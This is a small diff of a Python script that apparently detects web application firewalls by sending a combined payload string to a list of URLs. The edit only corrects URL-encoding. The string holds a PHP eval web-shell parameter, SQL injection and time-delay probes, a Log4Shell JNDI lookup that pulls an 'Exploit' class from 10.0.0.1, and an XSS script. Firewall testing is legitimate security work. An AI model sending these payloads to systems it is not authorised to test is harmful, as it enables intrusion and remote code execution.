@@ -121,7 +121,7 @@ except:
     sys.exit()
 urls = read_urls_from_file(url_file_path)
 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
-payloads = ["?a=<%3fphp+%40eval($_GET['cmd'])%3b%3f>%26b%3d1'+or+'1'%3d'1&c=${jndi%3aldap%3a//10.0.0.1%3a8080/Exploit}&s=<script>alert(1)</script>&id=UNION+SELECT+ALL+FROM+information_schema+AND+'+or+SLEEP(5)+or+'"]  # 这里可以添加更多的payload
+payloads = ["?a=<%3fphp+%40eval($_GET['cmd'])%3b%3f>&b=1'+or+'1'%3d'1&c=${jndi%3aldap%3a//10.0.0.1%3a8080/Exploit}&s=<script>alert(1)</script>&id=UNION+SELECT+ALL+FROM+information_schema+AND+'+or+SLEEP(5)+or+'"]  # 这里可以添加更多的payload
 results = []
 for url in urls:
     results.extend(check_waf(url, payloads, headers))
